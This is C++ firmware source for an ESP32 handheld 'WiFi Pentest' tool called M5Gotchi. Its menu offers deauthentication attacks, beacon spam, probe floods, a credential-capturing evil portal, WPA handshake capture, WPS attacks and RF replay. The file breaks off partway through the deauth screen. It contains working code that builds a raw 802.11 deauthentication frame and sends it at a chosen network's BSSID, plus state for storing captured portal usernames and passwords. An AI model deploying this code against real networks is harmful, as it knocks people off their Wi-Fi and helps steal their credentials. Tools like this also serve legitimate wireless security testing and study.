/*
 * M5Gotchi PRO - WiFi Pentest Edition
 * Build funcional com WiFi scanning e ataques básicos
 * Refatorado para melhor organização e manutenibilidade
 */

#include <M5Unified.h>
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <FS.h>
#include "esp_wifi_types.h"

// Hardware modules
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <IRrecv.h>
#include <IRutils.h>
#include <RCSwitch.h>
#include <SPI.h>
#include <LoRa.h>
#include <TinyGPSPlus.h>
#include <HardwareSerial.h>

// M5Gotchi modules
#include "m5gotchi_rfid_nfc.h"
#include "bluetooth_attacks.h"
#include "m5gotchi_neko_virtual_pet.h"
#include "m5gotchi_tutorial_system.h"
#include "m5gotchi_achievement_manager.h"
#include "stage5_dashboard.h"

// Refactored infrastructure modules
#include "DisplayHelper.h"
#include "ConfigManager.h"
#include "StateManager.h"
#include "MenuManager.h"

// Use Config namespace for easier access
using namespace Config;

// ==================== CONFIGURAÇÕES ====================
// NOTA: Constantes movidas para ConfigManager.h (Config namespace)
// Acesse via: Config::Display::WIDTH, Config::WiFi::MAX_NETWORKS, etc.

// Backward compatibility aliases (serão removidos gradualmente)
#define SCREEN_WIDTH Config::Display::WIDTH
#define SCREEN_HEIGHT Config::Display::HEIGHT
#define MAX_NETWORKS Config::WiFi::MAX_NETWORKS
#define SD_SCK Config::SDCard::SCK_PIN
#define SD_MISO Config::SDCard::MISO_PIN
#define SD_MOSI Config::SDCard::MOSI_PIN
#define SD_CS Config::SDCard::CS_PIN
#define DNS_PORT Config::WiFi::DNS_PORT
#define HTTP_PORT Config::WiFi::HTTP_PORT
#define MAX_CLIENTS Config::WiFi::MAX_CLIENTS
#define EAPOL_FRAME Config::WiFi::EAPOL_FRAME
#define SNAP_LEN Config::WiFi::SNAP_LEN
#define HANDSHAKE_DIR Config::Paths::HANDSHAKE_DIR
#define PORTAL_DIR Config::Paths::PORTAL_DIR
#define CREDS_FILE Config::Paths::CREDS_FILE
#define IR_TX_PIN Config::IR::TX_PIN
#define IR_RX_PIN Config::IR::RX_PIN
#define IR_FREQUENCY Config::IR::FREQUENCY
#define MAX_IR_CODES Config::IR::MAX_CODES
#define RF_TX_PIN Config::RF::TX_PIN
#define RF_RX_PIN Config::RF::RX_PIN
#define MAX_RF_CODES Config::RF::MAX_CODES
#define LORA_SCK Config::LoRa::SCK_PIN
#define LORA_MISO Config::LoRa::MISO_PIN
#define LORA_MOSI Config::LoRa::MOSI_PIN
#define LORA_CS Config::LoRa::CS_PIN
#define LORA_RST Config::LoRa::RST_PIN
#define LORA_IRQ Config::LoRa::IRQ_PIN
#define LORA_FREQUENCY Config::LoRa::FREQUENCY
#define MAX_LORA_DEVICES Config::LoRa::MAX_DEVICES
#define GPS_RX_PIN Config::GPS::RX_PIN
#define GPS_TX_PIN Config::GPS::TX_PIN
#define GPS_BAUD Config::GPS::BAUD_RATE
#define GPS_UPDATE_INTERVAL Config::GPS::UPDATE_INTERVAL_MS

// NOTA: OperationMode enum movido para StateManager.h
// Mantendo aqui temporariamente para compatibilidade

// ==================== ESTRUTURAS ====================
struct NetworkInfo {
    String ssid;
    uint8_t bssid[6];
    int8_t rssi;
    uint8_t channel;
    uint8_t encryption;
    bool selected;
};

struct HandshakeInfo {
    uint8_t bssid[6];
    bool hasMsg1;
    bool hasMsg2;
    bool hasMsg3;
    bool hasMsg4;
    unsigned long captureTime;
};

struct IRCode {
    String name;
    String protocol;
    uint64_t code;
    uint16_t bits;
};

struct RFCode {
    String name;
    unsigned long code;
    unsigned int bitLength;
    unsigned int pulseLength;
    String protocol;
};

struct LoRaDevice {
    String name;
    int rssi;
    float snr;
    uint8_t addr[4];
    unsigned long lastSeen;
    int packetCount;
};

// ==================== VARIÁVEIS GLOBAIS ====================
// MIGRADO: Variáveis WiFi/Attack movidas para STATE.*
// Uso: STATE.wifi.*, STATE.deauth.*, STATE.beaconSpam.*, STATE.probeFlood.*
OperationMode currentMode = MODE_DASHBOARD;  // TODO: Migrar para STATE.currentMode
NetworkInfo networks[MAX_NETWORKS];
// int networkCount = 0;  // MIGRADO → STATE.wifi.networkCount
// int selectedNetwork = 0;  // MIGRADO → STATE.wifi.selectedNetwork
// bool isDeauthing = false;  // MIGRADO → STATE.deauth.isDeauthing
// bool isBeaconSpamming = false;  // MIGRADO → STATE.beaconSpam.isBeaconSpamming
// bool isProbeFlooding = false;  // MIGRADO → STATE.probeFlood.isProbeFlooding
// unsigned long lastDeauth = 0;  // MIGRADO → STATE.deauth.lastDeauth
// unsigned long lastBeacon = 0;  // MIGRADO → STATE.beaconSpam.lastBeacon
// unsigned long lastProbe = 0;  // MIGRADO → STATE.probeFlood.lastProbe
// unsigned long deauthCount = 0;  // MIGRADO → STATE.deauth.deauthCount
// unsigned long beaconCount = 0;  // MIGRADO → STATE.beaconSpam.beaconCount
// unsigned long probeCount = 0;  // MIGRADO → STATE.probeFlood.probeCount
int menuSelection = 0;  // TODO: Migrar para STATE.menu.selectedItem
// String customSSID = "FREE_WiFi";  // MIGRADO → STATE.wifi.customSSID

// ==================== ALIASES PARA STATEMANAGER ====================
// Aliases temporários para compatibilidade (usando StateManager)
// WiFi & Attacks
#define networkCount STATE.wifi.networkCount
#define selectedNetwork STATE.wifi.selectedNetwork
#define isDeauthing STATE.deauth.isDeauthing
#define isBeaconSpamming STATE.beaconSpam.isBeaconSpamming
#define isProbeFlooding STATE.probeFlood.isProbeFlooding
#define lastDeauth STATE.deauth.lastDeauth
#define lastBeacon STATE.beaconSpam.lastBeacon
#define lastProbe STATE.probeFlood.lastProbe
#define deauthCount STATE.deauth.deauthCount
#define beaconCount STATE.beaconSpam.beaconCount
#define probeCount STATE.probeFlood.probeCount
#define customSSID STATE.wifi.customSSID

// Handshake
#define isCapturingHandshake STATE.handshake.isCapturingHandshake
#define eapolPackets STATE.handshake.eapolPackets
#define captureStartTime STATE.handshake.captureStartTime
#define handshakeComplete STATE.handshake.handshakeComplete

// Evil Portal
#define portalRunning STATE.portal.isRunning
#define clientsConnected STATE.portal.connectedClients
#define credentialsCaptured STATE.portal.capturedCredentials
#define capturedUsername STATE.portal.capturedUsername
#define capturedPassword STATE.portal.capturedPassword
#define portalStartTime STATE.portal.portalStartTime
#define customPortalHTML STATE.portal.customPortalHTML
#define useCustomPortal STATE.portal.useCustomPortal

// File Manager
#define sdCardAvailable STATE.sdCardAvailable
#define currentDir STATE.fileManager.currentPath
#define selectedFile STATE.fileManager.selectedItem
#define fileListScroll STATE.fileManager.scrollOffset

// Channel Analyzer
#define channelCount STATE.channelAnalyzer.channelCount
#define channelMaxRSSI STATE.channelAnalyzer.channelMaxRSSI
#define bestChannel STATE.channelAnalyzer.bestChannel
#define isAnalyzing STATE.channelAnalyzer.isAnalyzing
#define analyzeStartTime STATE.channelAnalyzer.analyzeStartTime

// Packet Monitor
#define beaconPackets STATE.packetMonitor.beaconPackets
#define dataPackets STATE.packetMonitor.dataPackets
#define mgmtPackets STATE.packetMonitor.mgmtPackets
#define totalPackets STATE.packetMonitor.totalPackets
#define lastPacketTime STATE.packetMonitor.lastPacketTime
#define packetsPerSecond STATE.packetMonitor.packetsPerSecond
#define isMonitoring STATE.packetMonitor.isMonitoring

// GPS Wardriving
#define gpsAvailable STATE.gps.gpsAvailable
#define currentLat STATE.gps.latitude
#define currentLon STATE.gps.longitude
#define currentAlt STATE.gps.altitude
#define currentSpeed STATE.gps.speed
#define gpsSatellites STATE.gps.satellites
#define gpsFixed STATE.gps.gpsFixed
#define gpsHDOP STATE.gps.hdop
#define lastGPSUpdate STATE.gps.lastUpdate
#define wifiLogged STATE.gps.wifiLogged
#define isWardriving STATE.gps.isWardriving
#define wardrivingStartTime STATE.gps.wardrivingStartTime
#define wardrivingFile STATE.gps.wardrivingFile
#define gpxTrackFile STATE.gps.gpxTrackFile
#define gpxPointCount STATE.gps.gpxPointCount

// Statistics
#define sessionStartTime STATE.statistics.sessionStartTime
#define totalScans STATE.statistics.totalScans
#define totalNetworksFound STATE.statistics.totalNetworksFound
#define totalDeauthSent STATE.statistics.totalDeauthSent
#define totalBeaconsSent STATE.statistics.totalBeaconsSent
#define totalProbesSent STATE.statistics.totalProbesSent
#define totalHandshakesCaptured STATE.statistics.totalHandshakesCaptured
#define totalCredentialsCaptured STATE.statistics.totalCredentialsCaptured
#define totalAPsLogged STATE.statistics.totalAPsLogged

// Config
#define configFile STATE.config.configFile
#define sessionFile STATE.config.sessionFile
#define statsFile STATE.config.statsFile
#define logFile STATE.config.logFile
#define autoSaveEnabled STATE.config.autoSaveEnabled
#define lastAutoSave STATE.config.lastAutoSave

// WPS
#define isWPSAttacking STATE.wps.isWPSAttacking
#define wpsStartTime STATE.wps.wpsStartTime
#define wpsPinsTried STATE.wps.wpsPinsTried
#define wpsVulnerableAPs STATE.wps.wpsVulnerableAPs
#define wpsTargetSSID STATE.wps.wpsTargetSSID
#define wpsLastAttempt STATE.wps.wpsLastAttempt

// IR Remote
#define irAvailable STATE.ir.irAvailable
#define irCodeCount STATE.ir.irCodeCount
#define selectedIRCode STATE.ir.selectedIRCode
#define isLearningIR STATE.ir.isLearningIR
#define isTransmittingIR STATE.ir.isTransmittingIR
#define irMode STATE.ir.irMode

// RF 433MHz
#define rf433Available STATE.rf.rf433Available
#define rfCodeCount STATE.rf.rfCodeCount
#define selectedRFCode STATE.rf.selectedRFCode
#define isCapturingRF STATE.rf.isCapturingRF
#define isReplayingRF STATE.rf.isReplayingRF

// LoRa
#define loraAvailable STATE.lora.loraAvailable
#define loraDeviceCount STATE.lora.loraDeviceCount
#define selectedLoRaDevice STATE.lora.selectedLoRaDevice
#define isScanningLoRa STATE.lora.isScanningLoRa
#define lastLoRaScan STATE.lora.lastLoRaScan
#define loraPacketsReceived STATE.lora.loraPacketsReceived

// Logs
#define logCount STATE.log.logCount
#define logViewScroll STATE.log.logViewScroll
#define autoSaveLogsEnabled STATE.log.autoSaveLogsEnabled

// RFID/NFC Module
M5GotchiRFIDNFC* rfidModule = nullptr;

// Bluetooth Attacks Module
BluetoothAttacks* bleModule = nullptr;

// Neko Virtual Pet Module
M5GotchiNekoVirtualPet* nekoPet = nullptr;

// Tutorial System
TutorialSystem* tutorialSystem = nullptr;

// Achievement Manager
AchievementManager* achievementManager = nullptr;

// Logging System
enum LogLevel { LOG_INFO, LOG_WARNING, LOG_ERROR, LOG_SUCCESS };
struct LogEntry {
    unsigned long timestamp;
    LogLevel level;
    String message;
};
#define MAX_LOG_ENTRIES 50
LogEntry logBuffer[MAX_LOG_ENTRIES];  // Mantém array local
// int logCount = 0;  // MIGRADO → STATE.log.logCount
// int logViewScroll = 0;  // MIGRADO → STATE.log.logViewScroll
// bool autoSaveLogsEnabled = true;  // MIGRADO → STATE.log.autoSaveLogsEnabled

// Handshake Capture
// bool isCapturingHandshake = false;  // MIGRADO → STATE.handshake.isCapturingHandshake
HandshakeInfo handshake;
// int eapolPackets = 0;  // MIGRADO → STATE.handshake.eapolPackets
// unsigned long captureStartTime = 0;  // MIGRADO → STATE.handshake.captureStartTime
// bool handshakeComplete = false;  // MIGRADO → STATE.handshake.handshakeComplete

// Evil Portal
WebServer* webServer = nullptr;
DNSServer* dnsServer = nullptr;
// bool portalRunning = false;  // MIGRADO → STATE.portal.isRunning
// int clientsConnected = 0;  // MIGRADO → STATE.portal.connectedClients
// int credentialsCaptured = 0;  // MIGRADO → STATE.portal.capturedCredentials
// String capturedUsername = "";  // MIGRADO → STATE.portal.capturedUsername
// String capturedPassword = "";  // MIGRADO → STATE.portal.capturedPassword
// unsigned long portalStartTime = 0;  // MIGRADO → STATE.portal.portalStartTime
// String customPortalHTML = "";  // MIGRADO → STATE.portal.customPortalHTML
// bool useCustomPortal = false;  // MIGRADO → STATE.portal.useCustomPortal

// File Manager
// bool sdCardAvailable = false;  // MIGRADO → STATE.sdCardAvailable
// String currentDir = "/";  // MIGRADO → STATE.fileManager.currentPath
std::vector<String> fileList;
// int selectedFile = 0;  // MIGRADO → STATE.fileManager.selectedItem
// int fileListScroll = 0;  // MIGRADO → STATE.fileManager.scrollOffset

// Channel Analyzer
// int channelCount[14] = {0};  // MIGRADO → STATE.channelAnalyzer.channelCount[]
// int channelMaxRSSI[14] = {...};  // MIGRADO → STATE.channelAnalyzer.channelMaxRSSI[]
// int bestChannel = 1;  // MIGRADO → STATE.channelAnalyzer.bestChannel
// bool isAnalyzing = false;  // MIGRADO → STATE.channelAnalyzer.isAnalyzing
// unsigned long analyzeStartTime = 0;  // MIGRADO → STATE.channelAnalyzer.analyzeStartTime

// Packet Monitor
// unsigned long beaconPackets = 0;  // MIGRADO → STATE.packetMonitor.beaconPackets
// unsigned long dataPackets = 0;  // MIGRADO → STATE.packetMonitor.dataPackets
// unsigned long mgmtPackets = 0;  // MIGRADO → STATE.packetMonitor.mgmtPackets
// unsigned long totalPackets = 0;  // MIGRADO → STATE.packetMonitor.totalPackets
// unsigned long lastPacketTime = 0;  // MIGRADO → STATE.packetMonitor.lastPacketTime
// int packetsPerSecond = 0;  // MIGRADO → STATE.packetMonitor.packetsPerSecond
// bool isMonitoring = false;  // MIGRADO → STATE.packetMonitor.isMonitoring

// GPS Wardriving
TinyGPSPlus gps;
HardwareSerial gpsSerial(1);  // Use UART1
// bool gpsAvailable = false;  // MIGRADO → STATE.gps.gpsAvailable
// float currentLat = 0.0;  // MIGRADO → STATE.gps.latitude
// float currentLon = 0.0;  // MIGRADO → STATE.gps.longitude
// float currentAlt = 0.0;  // MIGRADO → STATE.gps.altitude
// float currentSpeed = 0.0;  // MIGRADO → STATE.gps.speed
// int gpsSatellites = 0;  // MIGRADO → STATE.gps.satellites
// bool gpsFixed = false;  // MIGRADO → STATE.gps.gpsFixed
// float gpsHDOP = 99.99;  // MIGRADO → STATE.gps.hdop
// unsigned long lastGPSUpdate = 0;  // MIGRADO → STATE.gps.lastUpdate
// int wifiLogged = 0;  // MIGRADO → STATE.gps.wifiLogged
// bool isWardriving = false;  // MIGRADO → STATE.gps.isWardriving
// unsigned long wardrivingStartTime = 0;  // MIGRADO → STATE.gps.wardrivingStartTime
// String wardrivingFile = "/wardriving.csv";  // MIGRADO → STATE.gps.wardrivingFile
// String gpxTrackFile = "/gps_track.gpx";  // MIGRADO → STATE.gps.gpxTrackFile
// int gpxPointCount = 0;  // MIGRADO → STATE.gps.gpxPointCount

// Statistics
// unsigned long sessionStartTime = 0;  // MIGRADO → STATE.statistics.sessionStartTime
// unsigned long totalScans = 0;  // MIGRADO → STATE.statistics.totalScans
// unsigned long totalNetworksFound = 0;  // MIGRADO → STATE.statistics.totalNetworksFound
// unsigned long totalDeauthSent = 0;  // MIGRADO → STATE.statistics.totalDeauthSent
// unsigned long totalBeaconsSent = 0;  // MIGRADO → STATE.statistics.totalBeaconsSent
// unsigned long totalProbesSent = 0;  // MIGRADO → STATE.statistics.totalProbesSent
// unsigned long totalHandshakesCaptured = 0;  // MIGRADO → STATE.statistics.totalHandshakesCaptured
// unsigned long totalCredentialsCaptured = 0;  // MIGRADO → STATE.statistics.totalCredentialsCaptured
// unsigned long totalAPsLogged = 0;  // MIGRADO → STATE.statistics.totalAPsLogged

// Persistence & Config
// String configFile = "/config.json";  // MIGRADO → STATE.config.configFile
// String sessionFile = "/session.json";  // MIGRADO → STATE.config.sessionFile
// String statsFile = "/stats.json";  // MIGRADO → STATE.config.statsFile
// String logFile = "/system.log";  // MIGRADO → STATE.config.logFile
// bool autoSaveEnabled = true;  // MIGRADO → STATE.config.autoSaveEnabled
// unsigned long lastAutoSave = 0;  // MIGRADO → STATE.config.lastAutoSave
const unsigned long AUTO_SAVE_INTERVAL = 60000; // 1 minute

// Theme system
enum Theme {
    THEME_DARK = 0,
    THEME_NEON,
    THEME_KAWAII,
    THEME_MATRIX,
    THEME_TERMINAL
};
Theme currentTheme = THEME_DARK;

struct ThemeColors {
    uint16_t bg;
    uint16_t fg;
    uint16_t primary;
    uint16_t secondary;
    uint16_t success;
    uint16_t warning;
    uint16_t error;
    uint16_t header;
};

ThemeColors themeColors = {
    TFT_BLACK,      // bg
    TFT_WHITE,      // fg
    TFT_CYAN,       // primary
    TFT_YELLOW,     // secondary
    TFT_GREEN,      // success
    TFT_ORANGE,     // warning
    TFT_RED,        // error
    TFT_DARKGREEN   // header
};

// WPS Attack
// bool isWPSAttacking = false;  // MIGRADO → STATE.wps.isWPSAttacking
// unsigned long wpsStartTime = 0;  // MIGRADO → STATE.wps.wpsStartTime
// int wpsPinsTried = 0;  // MIGRADO → STATE.wps.wpsPinsTried
// int wpsVulnerableAPs = 0;  // MIGRADO → STATE.wps.wpsVulnerableAPs
// String wpsTargetSSID = "";  // MIGRADO → STATE.wps.wpsTargetSSID
uint8_t wpsTargetBSSID[6];  // Mantém array local (pode ser migrado depois)
// unsigned long wpsLastAttempt = 0;  // MIGRADO → STATE.wps.wpsLastAttempt

// IR Universal Remote
IRsend* irSender = nullptr;
IRrecv* irReceiver = nullptr;
// bool irAvailable = false;  // MIGRADO → STATE.ir.irAvailable
IRCode irCodes[MAX_IR_CODES];  // Mantém array local
// int irCodeCount = 0;  // MIGRADO → STATE.ir.irCodeCount
// int selectedIRCode = 0;  // MIGRADO → STATE.ir.selectedIRCode
// bool isLearningIR = false;  // MIGRADO → STATE.ir.isLearningIR
uint64_t learnedIRCode = 0;  // Mantém (variável temporária)
// String irMode = "TV";  // MIGRADO → STATE.ir.irMode

// RF 433MHz
RCSwitch* rfTransmitter = nullptr;
RCSwitch* rfReceiver = nullptr;
// bool rf433Available = false;  // MIGRADO → STATE.rf.rf433Available
RFCode rfCodes[MAX_RF_CODES];  // Mantém array local
// int rfCodeCount = 0;  // MIGRADO → STATE.rf.rfCodeCount
// int selectedRFCode = 0;  // MIGRADO → STATE.rf.selectedRFCode
// bool isCapturingRF = false;  // MIGRADO → STATE.rf.isCapturingRF
// bool isReplayingRF = false;  // MIGRADO → STATE.rf.isReplayingRF

// LoRa Scanner
// bool loraAvailable = false;  // MIGRADO → STATE.lora.loraAvailable
LoRaDevice loraDevices[MAX_LORA_DEVICES];  // Mantém array local
// int loraDeviceCount = 0;  // MIGRADO → STATE.lora.loraDeviceCount
// int selectedLoRaDevice = 0;  // MIGRADO → STATE.lora.selectedLoRaDevice
// bool isScanningLoRa = false;  // MIGRADO → STATE.lora.isScanningLoRa
// unsigned long lastLoRaScan = 0;  // MIGRADO → STATE.lora.lastLoRaScan
// int loraPacketsReceived = 0;  // MIGRADO → STATE.lora.loraPacketsReceived

// ==================== FORWARD DECLARATIONS ====================
void drawMenu();
void drawWiFiList();
void drawDeauthScreen();
void drawBeaconSpamScreen();
void drawProbeFloodScreen();
void drawEvilPortalScreen();
void drawHandshakeScreen();
void scanWiFi();
void startDeauth();
void stopDeauth();
void updateDeauth();
void startBeaconSpam();
void stopBeaconSpam();
void updateBeaconSpam();
void startProbeFlood();
void stopProbeFlood();
void updateProbeFlood();
void startEvilPortal();
void stopEvilPortal();
void updateEvilPortal();
void startHandshakeCapture();
void stopHandshakeCapture();
void updateHandshakeCapture();
void startFileManager();
void drawFileManager();
void updateFileManager();
void stopFileManager();
void startChannelAnalyzer();
void drawChannelAnalyzer();
void updateChannelAnalyzer();
void stopChannelAnalyzer();
void startPacketMonitor();
void drawPacketMonitor();
void updatePacketMonitor();
void stopPacketMonitor();
void startGPSWardriving();
void drawGPSWardriving();
void updateGPSWardriving();
void stopGPSWardriving();
void initGPS();
void updateGPSData();
void saveGPXTrackPoint();
void startStatistics();
void drawStatistics();
void startWPSAttack();
void drawWPSAttack();
void updateWPSAttack();
void stopWPSAttack();
void startIRRemote();
void drawIRRemote();
void updateIRRemote();
void stopIRRemote();
void startRF433();
void drawRF433();
void updateRF433();
void stopRF433();
void startLoRaScanner();
void drawLoRaScanner();
void updateLoRaScanner();
void stopLoRaScanner();
void startRFIDNFC();
void drawRFIDNFC();
void updateRFIDNFC();
void stopRFIDNFC();
void startBluetooth();
void drawBluetooth();
void updateBluetooth();
void stopBluetooth();
void startNekoPet();
void drawNekoPet();
void updateNekoPet();
void stopNekoPet();
void startTutorial();
void drawTutorial();
void updateTutorial();
void stopTutorial();
void startAchievements();
void drawAchievements();
void updateAchievements();
void stopAchievements();
void showSystemInfo();
void showThemeSelector();
void showHelpScreen();
void showLogViewer();
void addLog(LogLevel level, const char* message);
void addLog(LogLevel level, String message);
void saveLogsToSD();
void clearLogs();

// Persistence functions
void loadConfig();
void saveConfig();
void loadSession();
void saveSession();
void loadStats();
void saveStats();
void autoSaveAll();
void writeLog(const char* message);
void applyTheme(Theme theme);

// ==================== FUNÇÕES AUXILIARES ====================
// REFATORADO: Agora usa DisplayHelper
void drawHeader(const char* title) {
    DisplayHelper::drawHeader(title, themeColors);
}

void drawStatusBar() {
    char statusText[32];
    snprintf(statusText, sizeof(statusText), "RAM:%dKB", ESP.getFreeHeap() / 1024);
    DisplayHelper::drawFooter(statusText, themeColors);
}

// ==================== THEME SELECTOR ====================
void showThemeSelector() {
    int selectedTheme = currentTheme;
    bool running = true;
    
    while (running) {
        M5.Display.clear(themeColors.bg);
        drawHeader("Theme Selector");
        
        const char* themeNames[] = {
            "1. Dark (Default)",
            "2. Neon Cyberpunk", 
            "3. Kawaii Pastel",
            "4. Matrix Green",
            "5. Hacker Terminal"
        };
        
        const char* themeDesc[] = {
            "Black bg, Cyan accent",
            "Purple bg, Magenta/Cyan",
            "Pink bg, Pastel colors",
            "Black bg, Green mono",
            "Black bg, Terminal green"
        };
        
        M5.Display.setTextColor(themeColors.primary, themeColors.bg);
        M5.Display.setCursor(4, 24);
        M5.Display.println("Select Theme:");
        M5.Display.println();
        
        for (int i = 0; i < 5; i++) {
            if (i == selectedTheme) {
                M5.Display.setTextColor(themeColors.bg, themeColors.success);
                M5.Display.print("> ");
            } else {
                M5.Display.setTextColor(themeColors.fg, themeColors.bg);
                M5.Display.print("  ");
            }
            M5.Display.println(themeNames[i]);
            
            M5.Display.setTextColor(TFT_DARKGREY, themeColors.bg);
            M5.Display.print("    ");
            M5.Display.println(themeDesc[i]);
        }
        
        M5.Display.setTextColor(themeColors.warning, themeColors.bg);
        M5.Display.setCursor(4, SCREEN_HEIGHT - 24);
        M5.Display.println("[ENTER] Apply [ESC] Cancel");
        
        drawStatusBar();
        
        M5.update();
        
        if (M5Cardputer.Keyboard.isChange()) {
            if (M5Cardputer.Keyboard.isPressed()) {
                Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
                
                for (auto key : status.word) {
                    if (key >= '1' && key <= '5') {
                        selectedTheme = key - '1';
                    } else if (key == ';') { // Up
                        selectedTheme = (selectedTheme - 1 + 5) % 5;
                    } else if (key == '.') { // Down
                        selectedTheme = (selectedTheme + 1) % 5;
                    }
                }
                
                if (status.enter) { // ENTER to apply
                    applyTheme((Theme)selectedTheme);
                    saveConfig();
                    M5.Display.clear(themeColors.bg);
                    M5.Display.setCursor(60, 60);
                    M5.Display.setTextColor(themeColors.success, themeColors.bg);
                    M5.Display.println("Theme Applied!");
                    delay(800);
                    running = false;
                }
                
                if (status.del) { // ESC to cancel
                    running = false;
                }
            }
        }
        
        delay(10);
    }
    
    drawMenu();
}

// ==================== MENU ====================
// REFATORADO: Agora usa DisplayHelper para renderização mais limpa
void drawMenu() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("M5Gotchi WiFi Pentest");

    const char* menu[] = {
        "1. WiFi Scan",
        "2. Deauth Attack",
        "3. Beacon Spam",
        "4. Probe Flood",
        "5. Evil Portal",
        "6. Handshake Cap",
        "7. Channel Analyzer",
        "8. Packet Monitor",
        "9. File Manager",
        "A. GPS Wardriving",
        "B. Statistics",
        "C. WPS Attack",
        "D. IR Remote",
        "E. RF 433MHz",
        "F. LoRa Scanner",
        "G. RFID/NFC",
        "H. Bluetooth",
        "L. System Logs",
        "N. Neko Pet",
        "P. Tutorials",
        "Q. Achievements",
        "0. System Info"
    };

    // Scroll if needed (display max 12 items)
    int startIdx = max(0, min(menuSelection - 5, 22 - 12));
    int endIdx = min(22, startIdx + 12);

    // Render menu items using DisplayHelper
    for (int i = startIdx; i < endIdx; i++) {
        bool isSelected = (i == menuSelection);
        DisplayHelper::drawMenuItem(i - startIdx, menu[i], isSelected, themeColors);
    }

    // Hints usando DisplayHelper
    DisplayHelper::drawText("[T]Theme", SCREEN_WIDTH - 70, SCREEN_HEIGHT - 12, themeColors.primary);
    DisplayHelper::drawText("[?]Help", 4, SCREEN_HEIGHT - 12, themeColors.primary);

    drawStatusBar();
}

// ==================== WIFI SCAN ====================
// REFATORADO: Usa DisplayHelper
void scanWiFi() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Scanning WiFi...");
    DisplayHelper::drawText("Please wait...", 4, 24, themeColors.fg);
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks(false, true);
    networkCount = min(n, MAX_NETWORKS);
    
    // Update statistics
    totalScans++;
    totalNetworksFound += networkCount;
    
    // Pet reaction to network discovery
    if (nekoPet && networkCount > 0) {
        nekoPet->reactToNewNetwork(String(networkCount) + " networks");
    }
    
    // Achievement: First scan
    if (achievementManager) {
        achievementManager->onEvent(EVENT_WIFI_SCAN, 1);
    }
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        networks[i].encryption = WiFi.encryptionType(i);
        networks[i].selected = false;
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    }
    
    currentMode = MODE_WIFI_SCAN;
    selectedNetwork = 0;
    drawWiFiList();
}

// REFATORADO: Usa DisplayHelper para renderização mais limpa
void drawWiFiList() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("WiFi Networks");

    // Animated WiFi icon
    static int wifiAnimFrame = 0;
    const char* wifiFrames[] = {"📡", "📶", "📳", "📶"};
    DisplayHelper::drawText(wifiFrames[wifiAnimFrame % 4], 210, 4, themeColors.primary);
    wifiAnimFrame++;

    int startIdx = max(0, selectedNetwork - 5);
    int endIdx = min(networkCount, startIdx + 6);

    for (int i = startIdx; i < endIdx; i++) {
        int y = 24 + (i - startIdx) * 16;
        bool isSelected = (i == selectedNetwork);

        // Pulse effect for selected item
        if (isSelected) {
            static unsigned long lastPulse = 0;
            if (millis() - lastPulse > 500) {
                DisplayHelper::drawRect(0, y - 2, 4, 14, themeColors.success);
                lastPulse = millis();
            }
        }

        // Signal strength icon
        int rssi = networks[i].rssi;
        const char* signalIcon = (rssi > -50) ? "▰▰▰▰" :
                                 (rssi > -70) ? "▰▰▰▱" :
                                 (rssi > -80) ? "▰▰▱▱" : "▰▱▱▱";

        char line[40];
        snprintf(line, sizeof(line), "%s %.15s %ddBm",
                 signalIcon,
                 networks[i].ssid.c_str(),
                 networks[i].rssi);

        // Draw usando DisplayHelper
        uint32_t textColor = isSelected ? themeColors.bg : themeColors.fg;
        uint32_t bgColor = isSelected ? themeColors.success : themeColors.bg;

        if (isSelected) {
            DisplayHelper::drawRect(0, y - 2, SCREEN_WIDTH, 16, bgColor);
        }
        DisplayHelper::drawText(line, 4, y, textColor);
    }

    // Hints
    char infoText[50];
    snprintf(infoText, sizeof(infoText), "%d/%d [D]Auth [H]Handshake", selectedNetwork + 1, networkCount);
    DisplayHelper::drawText(infoText, 4, SCREEN_HEIGHT - 24, themeColors.secondary);
    DisplayHelper::drawText("[ESC]Back", 4, SCREEN_HEIGHT - 12, themeColors.secondary);

    drawStatusBar();
}

// ==================== DEAUTH ATTACK ====================
void sendDeauthPacket(uint8_t* bssid, uint8_t channel) {
    uint8_t deauth_packet[] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    
    memcpy(&deauth_packet[10], bssid, 6);
    memcpy(&deauth_packet[16], bssid, 6);
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
}

void startDeauth() {
    if (networkCount == 0) {
        M5.Display.clear(themeColors.bg);
        drawHeader("Deauth Attack");
        M5.Display.setCursor(4, 24);
        M5.Display.println("No networks found!");
        M5.Display.println("\nScan first (option 1)");
        delay(2000);
        currentMode = MODE_MENU;
        drawMenu();
        return;
    }
    
    currentMode = MODE_DEAUTH;
    isDeauthing = true;
    deauthCount = 0;
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    
    drawDeauthScreen();
}

// REFATORADO: Usa DisplayHelper para melhor organização
void drawDeauthScreen() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Deauth Attack");

    char targetInfo[50];
    snprintf(targetInfo, sizeof(targetInfo), "Target: %.18s", networks[selectedNetwork].ssid.c_str());
    DisplayHelper::drawText(targetInfo, 4, 24, themeColors.fg);

    char bssidInfo[50];
    snprintf(bssidInfo, sizeof(bssidInfo), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             networks[selectedNetwork].bssid[0],
             networks[selectedNetwork].bssid[1],
             networks[selectedNetwork].bssid[2],
             networks[selectedNetwork].bssid[3],
             networks[selectedNetwork].bssid[4],
             networks[selectedNetwork].bssid[5]);
    DisplayHelper::drawText(bssidInfo, 4, 34, themeColors.fg);

    char channelInfo[30];
    snprintf(channelInfo, sizeof(channelInfo), "Channel: %d", networks[selectedNetwork].channel);
